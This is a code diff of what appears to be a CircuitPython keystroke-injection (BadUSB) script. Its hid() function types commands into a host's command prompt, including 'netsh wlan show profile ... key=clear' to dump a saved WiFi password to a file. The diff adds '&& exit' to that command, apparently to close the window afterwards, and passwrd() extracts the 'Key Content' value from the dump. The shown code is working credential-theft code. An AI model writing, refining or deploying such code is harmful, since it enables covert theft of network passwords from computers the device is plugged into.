@@ -87,10 +87,10 @@ def hid():
     layout.write('cmd\n')
     time.sleep(1.75)
     for i in lst: layout.write(f'{i}\n')
-    layout.write(f"netsh wlan show profile name={name} key=clear > password.txt\n")
+    layout.write(f"netsh wlan show profile name={name} key=clear > password.txt && exit\n")
 def passwrd():
-    with open("password.txt","r") as f:
-        return f.readlines()[32].split("Key Content            : ")[1].replace("\n","")
+    with open("password.txt","r",encoding="utf-8") as f:
+        return f.readlines()[32].strip().split("Key Content            : ")[1]
 def composer(password):
     global first_read
     global name
@@ -104,7 +104,7 @@ def composer(password):
     print("Connecting to WiFi")
     string = loadflag()
     if "result" in string:
-        print(f"Composer Activated\nName: '"+secrets["ssid"]+"'\nPassword: '"+secrets["password"]+"'")
+        print(f"Composer Activated\nName: '"+secrets["ssid"]+"' Password: '"+secrets["password"]+"'")
         wifi.radio.connect(secrets['ssid'], secrets['password'])
         print("Connected to WiFi")
         pool = socketpool.SocketPool(wifi.radio)
